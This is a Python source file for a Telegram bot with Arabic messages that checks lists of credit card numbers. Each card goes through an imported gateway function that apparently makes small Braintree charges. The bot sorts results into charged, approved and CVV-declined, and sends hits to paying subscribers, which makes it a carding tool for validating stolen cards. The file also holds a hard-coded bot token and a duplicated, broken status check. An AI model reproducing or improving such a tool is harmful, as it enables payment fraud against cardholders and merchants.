import requests
import telebot, time
from telebot import types
from gatet import Tele
import os

token = '7262605762:AAGjaiJqnbQxjqtowxYAvBWhQRhpUDv8BPM'
bot = telebot.TeleBot(token, parse_mode="HTML")

subscribers = ['2134456129', ''] #ايديك

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "عذرا عزيزي لاتستطيع استعمال البوت الا بأذن من المالك لتواصل للاشتراك @MG_HB")
        return
    bot.reply_to(message, "Send The File Now \n ارسل الملف الان")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "عذرا عزيزي لاتستطيع استعمال البوت الا بأذن من المالك لتواصل للاشتراك @MG_HB")
        return
    
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    ko = bot.reply_to(message, "Checking Your Cards...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            for cc in lino:
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➤ @MG_HB')
                        os.remove('stop.stop')
                        return

                try:
                    data = requests.get('https://lookup.binlist.net/' + cc[:6]).json()
                except:
                    pass

                bank = data.get('bank', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                emj = data.get('country', {}).get('emoji', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                cn = data.get('country', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                dicr = data.get('scheme', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                typ = data.get('type', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                url = data.get('bank', {}).get('url', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')

                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"

                if 'Your card was declined.' in last:
                    last = 'declined'
                elif 'Your card was declined.' in last:
                    last = 'Approved'

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"• 𝗦َِ𝗧َِ𝗔َِ𝗧َِ𝗨َِ𝗦 : {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• 𝘾َِ𝙃َِ𝘼َِ𝙍َِ𝙂َِ𝙀 ✅  : [ {ch} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝘼َِ𝙋َِ𝙋َِ𝙍َِ𝙊َِ𝙑َِ𝙀َِ𝘿 ✅ : [ {live} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• َِ𝘾َِ𝘾َِ𝙉 ☑️ : [ {ccn} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"• 𝘿َِ𝙀َِ𝘾َِ𝙇َِ𝙄َِ𝙀َِ𝙉َِ𝘿  ❌ : [ {dd} ] •", callback_data='x')
                cm7 = types.InlineKeyboardButton(f"• 𝙏َِ𝙊َِ𝙏َِ𝘼َِ𝙇 🫠 : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, cm6, cm7, stop)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝘽َِ𝙊َِ𝙏 َِ𝘾َِ𝙃َِ𝙀َِ𝘾َِ𝙆 َِ𝘽َِ𝙔 @MG_HB''', reply_markup=mes)
                msg = f'''𝘼َِ𝙋َِ𝙋َِ𝙍َِ𝙊َِ𝙑َِ𝙀َِ𝘿 ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Charge
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Insufficient Funds

𝗜𝗻𝗳𝗼: {dicr} - {typ}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} - {emj}

𝗕𝗬: @MG_HB '''
                msg3 = f'''َِ𝘾َِ𝘾َِ𝙉 ☑️

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree Charge
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Issuer Declined CVV

𝗜𝗻𝗳𝗼: {dicr} - {typ}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} - {emj}

𝗕𝗬: @MG_HB '''
                
                print(last)
                if "Insufficient Funds" in last:
                    live += 1
                    bot.reply_to(message, msg)
                elif "true" in last:
                    ch += 1
                    msg1 = f'''𝘾َِ𝙃َِ𝘼َِ𝙍َِ𝙂َِ𝙀 ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thank you for your donation

𝗜𝗻𝗳𝗼: {dicr} - {typ}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} - {emj}

𝗕𝗬: @MG_HB '''
                    bot.reply_to(message, msg1)
                elif "Card Issuer Declined CVV" in last:
                    ccn += 1
                    bot.reply_to(message, msg3)
                else:
                    dd += 1
                time.sleep(1)
    except Exception as e:
        print(e)
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➤ @MG_HB')
print("تم تشغيل البوت")
bot.polling()